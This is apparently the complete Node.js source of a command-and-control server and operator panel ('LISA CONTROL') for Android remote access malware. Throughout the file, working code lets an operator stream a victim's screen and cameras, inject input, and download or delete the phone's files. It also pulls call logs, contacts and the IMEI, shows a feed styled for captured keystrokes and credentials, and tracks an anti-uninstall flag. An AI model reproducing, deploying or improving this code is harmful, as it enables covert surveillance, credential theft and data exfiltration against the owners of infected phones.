'use strict';
const http = require('http');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const PORT = process.env.PORT || 8080;
const devices = new Map();   // id -> { sock, meta, last, online, ip }
const panels = new Set();    // panel sockets
const pending = new Map();   // rid -> { panel, id }

const PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>LISA CONTROL</title><style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{--bg:#05070d;--pn:#0b1120;--ln:#16233a;--tx:#e6f0ff;--dim:#6d7f9c;--cy:#22d3ee;--mg:#e879f9;--ok:#34d399;--rd:#f87171;--am:#fbbf24}
html,body{min-height:100%;background:
 radial-gradient(1200px 600px at 10% -10%,rgba(34,211,238,.16),transparent 60%),
 radial-gradient(900px 500px at 110% 10%,rgba(232,121,249,.14),transparent 60%),
 var(--bg);
 color:var(--tx);font:14px/1.45 -apple-system,Roboto,Segoe UI,sans-serif}
header{position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:12px;
 padding:14px 16px;background:rgba(5,7,13,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--ln)}
.logo{font-weight:800;letter-spacing:.22em;font-size:14px;
 background:linear-gradient(90deg,var(--cy),var(--mg));-webkit-background-clip:text;background-clip:text;color:transparent;
 text-shadow:0 0 26px rgba(34,211,238,.55)}
.logo span{opacity:.55}
.hstat{margin-left:auto;display:flex;align-items:center;gap:8px;font-size:11px;color:var(--dim);
 border:1px solid var(--ln);border-radius:999px;padding:6px 12px;background:rgba(255,255,255,.03)}
.dot{width:8px;height:8px;border-radius:50%;background:var(--am);box-shadow:0 0 12px currentColor;animation:pulse 1.6s infinite}
.dot.on{background:var(--ok)}.dot.off{background:var(--rd);animation:none}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.72)}}
main{padding:18px;max-width:1180px;margin:0 auto}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(268px,1fr));gap:14px}
.card{position:relative;overflow:hidden;background:linear-gradient(160deg,rgba(20,32,54,.92),rgba(9,14,26,.95));
 border:1px solid var(--ln);border-radius:18px;padding:16px;cursor:pointer;transition:.18s}
.card:before{content:'';position:absolute;inset:0;background:radial-gradient(340px 120px at 0% 0%,rgba(34,211,238,.16),transparent 70%);opacity:.9}
.card:hover{transform:translateY(-3px);border-color:rgba(34,211,238,.5);box-shadow:0 18px 44px -18px rgba(34,211,238,.55)}
.card .top{display:flex;align-items:center;gap:10px;margin-bottom:10px;position:relative}
.card h3{font-size:15px;font-weight:700}
.card .id{font-size:10px;color:var(--dim);letter-spacing:.1em}
.pill{font-size:10px;padding:4px 9px;border-radius:999px;border:1px solid var(--ln);color:var(--dim);background:rgba(255,255,255,.04)}
.pill.on{color:var(--ok);border-color:rgba(52,211,153,.4);box-shadow:0 0 18px rgba(52,211,153,.28)}
.pill.off{color:var(--rd);border-color:rgba(248,113,113,.35)}
.card .meta{display:flex;flex-wrap:wrap;gap:6px;position:relative}
.card .meta span{font-size:10px;color:var(--dim);border:1px solid var(--ln);border-radius:8px;padding:3px 7px}
.empty{padding:70px 20px;text-align:center;color:var(--dim);border:1px dashed var(--ln);border-radius:18px}
.hide{display:none!important}
.phead{display:flex;align-items:center;gap:12px;padding:14px;border:1px solid var(--ln);border-radius:18px;
 background:rgba(11,17,32,.85);margin-bottom:14px;box-shadow:0 0 34px -18px rgba(34,211,238,.6)}
.phead h2{font-size:16px}
.phead .dim{font-size:11px;color:var(--dim)}
#back{width:38px;height:38px;flex:0 0 38px;border-radius:12px;border:1px solid var(--ln);
 background:rgba(255,255,255,.05);color:var(--tx);font-size:17px;cursor:pointer}
#back:hover{border-color:var(--cy);color:var(--cy)}
nav{display:flex;gap:6px;overflow-x:auto;padding-bottom:12px;margin-bottom:14px;border-bottom:1px solid var(--ln)}
nav button{white-space:nowrap;padding:9px 14px;border-radius:11px;border:1px solid var(--ln);
 background:rgba(255,255,255,.03);color:var(--dim);font-size:12px;cursor:pointer}
nav button.on{color:#04121a;background:linear-gradient(90deg,var(--cy),#67e8f9);border-color:transparent;
 box-shadow:0 0 24px rgba(34,211,238,.55);font-weight:700}
.pane{border:1px solid var(--ln);border-radius:18px;padding:16px;background:rgba(11,17,32,.6)}
.row{display:flex;justify-content:space-between;gap:12px;padding:9px 0;border-bottom:1px dashed rgba(22,35,58,.9);font-size:13px}
.row:last-child{border:0}.row b{font-weight:600}.row span{color:var(--dim)}
.btn{padding:10px 14px;border-radius:11px;border:1px solid var(--ln);background:rgba(255,255,255,.04);
 color:var(--tx);font-size:12px;cursor:pointer;transition:.15s}
.btn:hover{border-color:var(--cy);color:var(--cy);box-shadow:0 0 20px -6px rgba(34,211,238,.7)}
.btn.pri{background:linear-gradient(90deg,var(--cy),#67e8f9);color:#04121a;border:0;font-weight:700}
.btn.red:hover{border-color:var(--rd);color:var(--rd);box-shadow:0 0 20px -6px rgba(248,113,113,.7)}
.btn.ok:hover{border-color:var(--ok);color:var(--ok)}
.acts{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
#stage{position:relative;background:#000;border-radius:14px;overflow:hidden;border:1px solid var(--ln);
 box-shadow:0 0 60px -22px rgba(34,211,238,.7);display:flex;align-items:center;justify-content:center;min-height:220px}
#cv,#camimg{max-width:100%;max-height:74vh;display:block;touch-action:none}
#cammask{position:absolute;color:var(--dim);font-size:12px}
.bar{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
.bar .btn{flex:1;min-width:44px;text-align:center;padding:11px 0}
.bar .btn.on{background:rgba(34,211,238,.2);border-color:var(--cy);color:var(--cy)}
#kb{display:none;gap:6px;margin-top:8px}#kb.on{display:flex}
#kb input{flex:1;padding:11px;border-radius:11px;border:1px solid var(--ln);background:#04070d;color:#fff;outline:none}
#kb input:focus{border-color:var(--cy);box-shadow:0 0 22px -8px var(--cy)}
.path{display:flex;gap:6px;margin-bottom:10px}
.path input{flex:1;padding:10px;border-radius:10px;border:1px solid var(--ln);background:#04070d;color:var(--tx);font-size:12px;outline:none}
.flist{max-height:60vh;overflow:auto;border:1px solid var(--ln);border-radius:12px}
.frow{display:flex;align-items:center;gap:9px;padding:10px 12px;border-bottom:1px solid rgba(22,35,58,.7);cursor:pointer;font-size:13px}
.frow:hover{background:rgba(34,211,238,.07)}
.frow .nm{flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
.frow .sz{font-size:10px;color:var(--dim)}
.frow .x{color:var(--rd);font-size:12px;padding:2px 6px;border-radius:7px;border:1px solid rgba(248,113,113,.3)}
table{width:100%;border-collapse:collapse;font-size:12px}
td,th{text-align:left;padding:9px 8px;border-bottom:1px solid rgba(22,35,58,.8)}
th{color:var(--dim);font-weight:600;font-size:11px;letter-spacing:.08em}
#feed{max-height:56vh;overflow:auto;font:12px/1.6 ui-monospace,monospace}
#feed div{padding:7px 9px;border-left:2px solid var(--ln);margin-bottom:5px;color:#b7c8e0;word-break:break-word}
#feed div.k{color:#7dd3fc}#feed div.c{color:#fca5a5}#feed div.n{color:#fcd34d}
#toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%) translateY(20px);opacity:0;
 padding:11px 18px;border-radius:12px;background:rgba(11,17,32,.97);border:1px solid var(--cy);
 color:var(--cy);font-size:12px;transition:.22s;z-index:60;pointer-events:none;box-shadow:0 0 30px -8px var(--cy)}
#toast.on{opacity:1;transform:translateX(-50%) translateY(0)}
#modal{position:fixed;inset:0;background:rgba(0,0,0,.94);z-index:70;display:none;align-items:center;justify-content:center;padding:18px}
#modal.on{display:flex}#modal img{max-width:100%;max-height:88vh;border-radius:12px}
#mclose{position:absolute;top:16px;right:16px;width:40px;height:40px;border-radius:12px;border:1px solid var(--ln);background:rgba(255,255,255,.08);color:#fff}
</style></head><body>
<header><div class="logo">LISA<span>·CONTROL</span></div>
<div class="hstat"><span id="dot" class="dot"></span><span id="htxt">connecting</span></div></header>
<main>
<div id="devview"><div id="devgrid" class="grid"></div></div>
<section id="panelview" class="hide">
 <div class="phead"><button id="back">←</button>
  <div style="flex:1"><h2 id="pmodel">—</h2><div class="dim" id="pmeta"></div></div>
  <span id="pstate" class="pill">—</span></div>
 <nav id="tabs">
  <button data-tab="over" class="on">Overview</button><button data-tab="screen">Screen</button>
  <button data-tab="cam">Camera</button><button data-tab="files">Files</button>
  <button data-tab="calls">Calls</button><button data-tab="contacts">Contacts</button>
  <button data-tab="perms">Permissions</button><button data-tab="feed">Events</button>
 </nav>
 <div id="panes">
  <div class="pane" data-pane="over" id="pover">loading…</div>
  <div class="pane hide" data-pane="screen">
   <div id="stage"><canvas id="cv" width="360" height="720"></canvas></div>
   <div class="bar">
    <button class="btn" data-k="back">◀</button><button class="btn" data-k="home">⌂</button>
    <button class="btn" data-k="recents">▣</button><button class="btn" data-k="notif">🔔</button>
    <button class="btn" id="kbt">⌨</button><button class="btn" data-k="del">⌫</button>
    <button class="btn" data-k="lock">🔒</button></div>
   <div id="kb"><input id="txt" placeholder="type to device…"><button class="btn pri" id="send">↵</button></div>
   <div class="bar"><button class="btn pri" id="scrOn">Start stream</button>
    <button class="btn" id="scrOff">Stop</button><button class="btn" id="shot">📸 Shot</button></div>
  </div>
  <div class="pane hide" data-pane="cam">
   <div id="stage"><img id="camimg"><div id="cammask">camera idle</div></div>
   <div class="bar"><button class="btn" id="camF">🤳 Front</button><button class="btn" id="camB">📷 Back</button>
    <button class="btn" id="camOff">Stop</button><button class="btn" id="camShot">📸 Shot</button></div>
  </div>
  <div class="pane hide" data-pane="files">
   <div class="path"><input id="fpath" value="/sdcard"><button class="btn" id="fgo">Go</button>
    <button class="btn" id="fup">⬆</button><button class="btn" id="fmk">➕</button></div>
   <div class="flist" id="flist"></div>
  </div>
  <div class="pane hide" data-pane="calls"><div id="calls">loading…</div></div>
  <div class="pane hide" data-pane="contacts"><div id="contacts">loading…</div></div>
  <div class="pane hide" data-pane="perms"><div id="perms">loading…</div></div>
  <div class="pane hide" data-pane="feed"><div id="feed"></div></div>
 </div>
</section>
</main>
<div id="toast"></div><div id="modal"><button id="mclose">✕</button><div id="mbody"></div></div>
<script>
var ws, cur=null, tab='over', rid=0, reqs={}, upBuf=null, lastDev=[];
function $(s){return document.querySelector(s)}
function toast(m){var t=$('#toast');t.textContent=m;t.classList.add('on');clearTimeout(t._h);t._h=setTimeout(function(){t.classList.remove('on')},1800)}
function send(o){if(ws&&ws.readyState===1)ws.send(JSON.stringify(o))}
function cmd(o,cb){var r='r'+(++rid);reqs[r]=cb||null;o.rid=r;send({t:'cmd',id:cur.id,cmd:o});return r}
function conn(){
 ws=new WebSocket((location.protocol==='https:'?'wss://':'ws://')+location.host);
 ws.onopen=function(){send({role:'panel'});$('#dot').className='dot on';$('#htxt').textContent='online'};
 ws.onclose=function(){$('#dot').className='dot off';$('#htxt').textContent='reconnecting';setTimeout(conn,2500)};
 ws.onmessage=function(e){var m;try{m=JSON.parse(e.data)}catch(x){return};route(m)};
}
function route(m){
 if(m.t==='devices'){lastDev=m.list||[];renderDevices();return}
 if(m.t==='frame'){if(!cur)return;
   if(m.kind==='cam'){var i=$('#camimg');i.src='data:image/jpeg;base64,'+m.b64;$('#cammask').style.display='none';}
   else{var img=new Image();img.onload=function(){var c=$('#cv');if(c.width!==img.width){c.width=img.width;c.height=img.height}c.getContext('2d').drawImage(img,0,0)};img.src='data:image/jpeg;base64,'+m.b64}
   return}
 if(m.t==='event'){if(cur&&m.id===cur.id){addFeed(m.kind,m.text)}return}
 if(m.t==='res'){var cb=reqs[m.rid];if(cb){delete reqs[m.rid];cb(m)}return}
 if(m.t==='file'){onChunk(m);return}
}
function renderDevices(){
 var g=$('#devgrid');
 if(!lastDev.length){g.innerHTML='<div class="empty">No device connected yet.<br>Open the app on the phone once.</div>';return}
 g.innerHTML='';
 lastDev.forEach(function(d){
  var el=document.createElement('div');el.className='card';
  el.innerHTML='<div class="top"><h3>'+esc(d.model||'Device')+'</h3><span class="pill '+(d.online?'on':'off')+'">'+(d.online?'online':'offline')+'</span></div>'+
   '<div class="id">'+esc(d.id)+'</div><div class="meta"><span>Android '+esc(d.android||'?')+'</span><span>'+esc(d.batt)+'%</span><span>'+esc(d.brand||'')+'</span><span>'+(d.acc?'access on':'no access')+'</span></div>';
  el.onclick=function(){openDev(d)};g.appendChild(el);
 });
}
function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
function openDev(d){cur=d;$('#devview').classList.add('hide');$('#panelview').classList.remove('hide');
 $('#pmodel').textContent=d.model||'Device';$('#pmeta').textContent=d.id+' · Android '+(d.android||'?');
 $('#pstate').className='pill '+(d.online?'on':'off');$('#pstate').textContent=d.online?'online':'offline';
 send({t:'focus',id:d.id});$('#feed').innerHTML='';switchTab('over')}
$('#back').onclick=function(){cmd({t:'screen_stop'});cmd({t:'cam_stop'});cur=null;
 $('#panelview').classList.add('hide');$('#devview').classList.remove('hide')};
Array.prototype.forEach.call(document.querySelectorAll('#tabs button'),function(b){
 b.onclick=function(){switchTab(b.dataset.tab)}});
function switchTab(t){
 tab=t;Array.prototype.forEach.call(document.querySelectorAll('#tabs button'),function(b){b.classList.toggle('on',b.dataset.tab===t)});
 Array.prototype.forEach.call(document.querySelectorAll('.pane'),function(p){p.classList.toggle('hide',p.dataset.pane!==t)});
 if(!cur)return;
 if(t==='over')loadInfo();if(t==='files')loadDir($('#fpath').value);
 if(t==='calls')loadCalls();if(t==='contacts')loadContacts();if(t==='perms')loadPerms();
 if(t==='screen'||t==='cam'){}else{cmd({t:'screen_stop'});cmd({t:'cam_stop'})}
}
function loadInfo(){cmd({t:'req',op:'info'},function(m){
 if(!m.ok){$('#pover').textContent='failed';return}
 var d=m.data||{};$('#pover').innerHTML='';
 [['Model',d.model],['Brand',d.brand],['Android',d.android+' (SDK '+d.sdk+')'],['Battery',d.batt+'%'],
  ['Storage free',d.free],['IP',d.ip],['Carrier',d.carrier],['IMEI',d.imei],['Anti-uninstall',d.anti?'ON':'OFF'],
  ['Locked',d.locked?'YES':'no'],['Muted',d.muted?'YES':'no'],['Accessibility',d.acc?'ON':'OFF']].forEach(function(r){
  var x=document.createElement('div');x.className='row';x.innerHTML='<b>'+r[0]+'</b><span>'+esc(r[1])+'</span>';$('#pover').appendChild(x)});
 var a=document.createElement('div');a.className='acts';
 [['🔒 Lock','lock',1],['🔓 Unlock','unlock',0],['🔇 Mute','mute_on',1],['🔊 Unmute','mute_off',0],
  ['🔦 Torch','torch',1],['📳 Vibrate','vib',0],['💬 Toast','toast',0],['📋 Clipboard','clip',0],
  ['🗣 Speak','speak',0],['🖼 Wallpaper','wall',0],['📦 Apps','apps',0],['🗜 Zip sdcard','ziproot',0]].forEach(function(b){
   var el=document.createElement('button');el.className='btn';el.textContent=b[0];
   el.onclick=function(){quick(b[1])};a.appendChild(el)});
 $('#pover').appendChild(a)});}
function quick(op){
 if(op==='toast'||op==='clip'||op==='speak'){var v=prompt('Text:');if(!v)return;cmd({t:'req',op:op,v:v},toastOk);return}
 if(op==='vib'){var s=prompt('Seconds:','5');if(!s)return;cmd({t:'req',op:'vib',v:s},toastOk);return}
 if(op==='wall'){var u=prompt('Image URL:');if(!u)return;cmd({t:'req',op:'wall',v:u},toastOk);return}
 if(op==='apps'){cmd({t:'req',op:'apps'},function(m){showText((m.data&&m.data.list||[]).map(function(x){return x.l+'  '+x.p}).join('\n'))});return}
 if(op==='ziproot'){cmd({t:'req',op:'zip',path:'/sdcard'},function(m){if(m.ok)dl(m.data.path);else toast('zip failed')});return}
 cmd({t:'req',op:op},toastOk);
}
function toastOk(m){toast(m&&m.ok?'done':'failed')}
function showText(t){$('#mbody').innerHTML='<pre style="max-height:80vh;overflow:auto;color:#b7c8e0;font-size:12px">'+esc(t)+'</pre>';$('#modal').classList.add('on')}
$('#mclose').onclick=function(){$('#modal').classList.remove('on');$('#mbody').innerHTML=''};
/* screen */
$('#scrOn').onclick=function(){cmd({t:'screen_start',fps:4,q:55,w:640});toast('stream on')};
$('#scrOff').onclick=function(){cmd({t:'screen_stop'})};
$('#shot').onclick=function(){cmd({t:'req',op:'shot'},function(m){
 if(!m.ok){toast('failed');return}
 var i=new Image();i.src='data:image/jpeg;base64,'+m.data.b64;i.onload=function(){$('#mbody').innerHTML='';$('#mbody').appendChild(i);$('#modal').classList.add('on')}})};
$('#kbt').onclick=function(){$('#kb').classList.toggle('on');if($('#kb').classList.contains('on'))$('#txt').focus()};
$('#send').onclick=function(){var v=$('#txt').value;if(v){cmd({t:'text',v:v});$('#txt').value=''}};
$('#txt').onkeydown=function(e){if(e.key==='Enter'){e.preventDefault();$('#send').click()}};
Array.prototype.forEach.call(document.querySelectorAll('[data-k]'),function(b){
 b.onclick=function(){cmd({t:'key',k:b.dataset.k})}});
var cv=$('#cv'),down=false,sx=0,sy=0,st=0,moved=false;
function rel(e){var r=cv.getBoundingClientRect();return{x:(e.clientX-r.left)/r.width,y:(e.clientY-r.top)/r.height}}
cv.addEventListener('pointerdown',function(e){e.preventDefault();down=true;moved=false;var p=rel(e);sx=p.x;sy=p.y;st=Date.now();cv.setPointerCapture(e.pointerId)});
cv.addEventListener('pointermove',function(e){if(!down)return;var p=rel(e);if(Math.abs(p.x-sx)>.02||Math.abs(p.y-sy)>.02)moved=true});
cv.addEventListener('pointerup',function(e){if(!down)return;down=false;var p=rel(e),dt=Date.now()-st;
 if(!moved||dt<130)cmd({t:'tap',x:p.x,y:p.y});else cmd({t:'swipe',x1:sx,y1:sy,x2:p.x,y2:p.y,ms:Math.min(600,Math.max(120,dt))})});
/* camera */
$('#camF').onclick=function(){cmd({t:'cam_start',front:1});toast('front')};
$('#camB').onclick=function(){cmd({t:'cam_start',front:0});toast('back')};
$('#camOff').onclick=function(){cmd({t:'cam_stop'})};
$('#camShot').onclick=function(){cmd({t:'req',op:'shotcam'},function(m){
 if(!m.ok){toast('failed');return}
 var i=new Image();i.src='data:image/jpeg;base64,'+m.data.b64;i.onload=function(){$('#mbody').innerHTML='';$('#mbody').appendChild(i);$('#modal').classList.add('on')}})};
/* files */
$('#fgo').onclick=function(){loadDir($('#fpath').value)};
$('#fup').onclick=function(){var p=$('#fpath').value.replace(/\/[^\/]+\/?$/,'')||'/';loadDir(p)};
$('#fmk').onclick=function(){var n=prompt('Folder name:');if(!n)return;
 cmd({t:'req',op:'mkdir',path:$('#fpath').value,name:n},function(){loadDir($('#fpath').value)})};
function loadDir(p){$('#fpath').value=p||'/';
 cmd({t:'req',op:'ls',path:p},function(m){
  var box=$('#flist');box.innerHTML='';
  if(!m.ok){box.innerHTML='<div class="frow"><div class="nm">cannot open</div></div>';return}
  $('#fpath').value=m.data.path;
  (m.data.items||[]).forEach(function(it){
   var r=document.createElement('div');r.className='frow';
   r.innerHTML='<span>'+(it.d?'📁':(it.img?'🖼':(it.vid?'🎬':(it.aud?'🎵':'📄'))))+'</span><div class="nm">'+esc(it.n)+'</div><div class="sz">'+(it.d?'':fmt(it.s))+'</div>';
   var x=document.createElement('span');x.className='x';x.textContent='🗑';
   x.onclick=function(e){e.stopPropagation();if(confirm('Delete '+it.n+'?'))cmd({t:'req',op:'del',path:it.p},function(){loadDir($('#fpath').value)})};
   r.appendChild(x);
   r.onclick=function(){if(it.d)loadDir(it.p);else if(it.img||it.vid||it.aud)dl(it.p,1);else dl(it.p,0)};
   box.appendChild(r)})})}
function fmt(n){return n<1024?n+' B':n<1048576?(n/1024).toFixed(0)+' KB':n<1073741824?(n/1048576).toFixed(1)+' MB':(n/1073741824).toFixed(2)+' GB'}
function dl(p,inline){cmd({t:'req',op:'get',path:p},function(m){
 if(!m.ok){toast('download failed');return}
 upBuf={name:m.data.name,parts:[],total:m.data.total,inline:inline}})}
function onChunk(m){if(!upBuf)return;upBuf.parts[m.i]=m.b64;
 if(upBuf.parts.filter(Boolean).length<upBuf.total)return;
 var bin=atob(upBuf.parts.join('')),u8=new Uint8Array(bin.length);
 for(var i=0;i<bin.length;i++)u8[i]=bin.charCodeAt(i);
 var blob=new Blob([u8]);upBuf=null;
 if(blob.size<3000){var fr=new FileReader();fr.onload=function(){$('#mbody').innerHTML='';var im=new Image();im.src=fr.result;$('#mbody').appendChild(im);$('#modal').classList.add('on')};fr.readAsDataURL(blob);return}
 var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=m.name;document.body.appendChild(a);a.click();a.remove();toast('saved')}
/* calls, contacts, perms */
function loadCalls(){cmd({t:'req',op:'calls'},function(m){
 var box=$('#calls');if(!m.ok){box.textContent='failed';return}
 var l=(m.data&&m.data.items)||[];if(!l.length){box.textContent='no calls';return}
 var t='<table><tr><th>Number</th><th>Type</th><th>Duration</th><th>When</th></tr>';
 l.forEach(function(c){t+='<tr><td>'+esc(c.num)+'</td><td>'+['?','in','out','missed','vm','rej','blocked'][c.type]+'</td><td>'+c.dur+'s</td><td>'+new Date(c.date).toLocaleString()+'</td></tr>'});
 box.innerHTML=t+'</table>'})}
function loadContacts(){cmd({t:'req',op:'contacts'},function(m){
 var box=$('#contacts');if(!m.ok){box.textContent='failed';return}
 var l=(m.data&&m.data.items)||[];if(!l.length){box.textContent='no contacts';return}
 var t='<table><tr><th>Name</th><th>Number</th></tr>';
 l.forEach(function(c){t+='<tr><td>'+esc(c.n)+'</td><td>'+esc(c.num)+'</td></tr>'});
 box.innerHTML=t+'</table>'})}
function loadPerms(){cmd({t:'req',op:'perms'},function(m){
 var box=$('#perms');if(!m.ok){box.textContent='failed';return}
 box.innerHTML='';var l=(m.data&&m.data.items)||[];
 l.forEach(function(p){var r=document.createElement('div');r.className='row';
  r.innerHTML='<b>'+(p.ok?'✅ ':'❌ ')+esc(p.label)+'</b>';
  var a=document.createElement('span');
  if(!p.ok){var b=document.createElement('button');b.className='btn';b.textContent=p.runtime?'Request':'Open';
   b.onclick=function(){cmd({t:'req',op:p.runtime?'perm_req':'perm_open',perm:p.perm,idx:p.idx},function(){setTimeout(loadPerms,1200)})};
   a.appendChild(b)}else a.textContent='granted';
  r.appendChild(a);box.appendChild(r)})})}
function addFeed(k,t){var f=$('#feed');var d=document.createElement('div');
 d.className=k==='key'?'k':(k==='cred'?'c':(k==='notif'?'n':''));d.textContent='['+new Date().toLocaleTimeString()+'] '+t;
 f.appendChild(d);while(f.children.length>250)f.removeChild(f.firstChild);f.scrollTop=f.scrollHeight}
conn();
</script></body></html>`;

const srv = http.createServer((req, res) => {
  if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    return res.end(PAGE);
  }
  if (req.url === '/health') { res.writeHead(200); return res.end('ok'); }
  res.writeHead(404); res.end('404');
});

const wss = new WebSocketServer({ server: srv, maxPayload: 96 * 1024 * 1024 });

function bcastPanels(obj, except) {
  const s = JSON.stringify(obj);
  for (const p of panels) if (p !== except && p.readyState === 1) p.send(s);
}
function deviceList() {
  const list = [];
  for (const [id, d] of devices) list.push({
    id, model: d.meta.model, brand: d.meta.brand, android: d.meta.android,
    batt: d.meta.batt, acc: d.meta.acc, online: d.online, last: d.last
  });
  list.sort((a, b) => (b.online - a.online) || (b.last - a.last));
  return list;
}
function pushList() { bcastPanels({ t: 'devices', list: deviceList() }); }

wss.on('connection', (sock, req) => {
  const ip = (req.headers['x-forwarded-for'] || sock._socket.remoteAddress || '').split(',')[0].trim();
  let role = null, devId = null;

  sock.on('message', (raw) => {
    let m; try { m = JSON.parse(raw.toString()); } catch (e) { return; }

    if (!role) {
      if (m.role === 'panel') { role = 'panel'; panels.add(sock); sock.send(JSON.stringify({ t: 'devices', list: deviceList() })); return; }
      if (m.t === 'hello') {
        role = 'dev'; devId = String(m.id || '').slice(0, 40) || 'unknown';
        const old = devices.get(devId);
        if (old && old.sock !== sock) { try { old.sock.terminate(); } catch (e) {} }
        devices.set(devId, { sock, ip, online: true, last: Date.now(), meta: {
          model: m.model, brand: m.brand, android: m.android, sdk: m.sdk,
          batt: m.batt, acc: !!m.acc, perms: m.perms } });
        sock.send(JSON.stringify({ t: 'hello_ok', id: devId }));
        pushList();
        return;
      }
      return;
    }

    if (role === 'panel') {
      if (m.t === 'cmd') {
        const d = devices.get(m.id);
        if (!d || !d.online) { if (m.cmd && m.cmd.rid) sock.send(JSON.stringify({ t: 'res', rid: m.cmd.rid, ok: false, data: { err: 'offline' } })); return; }
        const rid = (m.cmd && m.cmd.rid) || crypto.randomBytes(6).toString('hex');
        pending.set(rid, { panel: sock, id: m.id });
        m.cmd.rid = rid;
        try { d.sock.send(JSON.stringify(m.cmd)); } catch (e) {}
      } else if (m.t === 'focus') { sock.focus = m.id; }
      return;
    }

    if (role === 'dev') {
      const d = devices.get(devId); if (d) d.last = Date.now();
      if (m.t === 'hb') { if (d) d.meta.batt = m.batt; return; }
      if (m.t === 'frame' || m.t === 'event') {
        m.id = devId;
        const s = JSON.stringify(m);
        for (const p of panels) if (p.readyState === 1 && p.focus === devId) p.send(s);
        return;
      }
      if (m.rid) {
        const p = pending.get(m.rid);
        if (p) { m.id = devId; if (p.panel.readyState === 1) p.panel.send(JSON.stringify(m)); if (m.t === 'res') pending.delete(m.rid); }
      }
    }
  });

  sock.on('close', () => {
    panels.delete(sock);
    if (role === 'dev' && devId) {
      const d = devices.get(devId);
      if (d && d.sock === sock) { d.online = false; d.last = Date.now(); pushList(); }
    }
  });
  sock.on('error', () => {});
});

setInterval(() => {
  const now = Date.now();
  for (const [id, d] of devices) {
    if (d.online && now - d.last > 55000) { try { d.sock.terminate(); } catch (e) {} d.online = false; pushList(); }
    if (!d.online && now - d.last > 6 * 3600e3) devices.delete(id);
  }
  for (const p of panels) if (p.readyState === 1) p.ping();
}, 15000);

srv.listen(PORT, '0.0.0.0', () => console.log('lisa server on ' + PORT));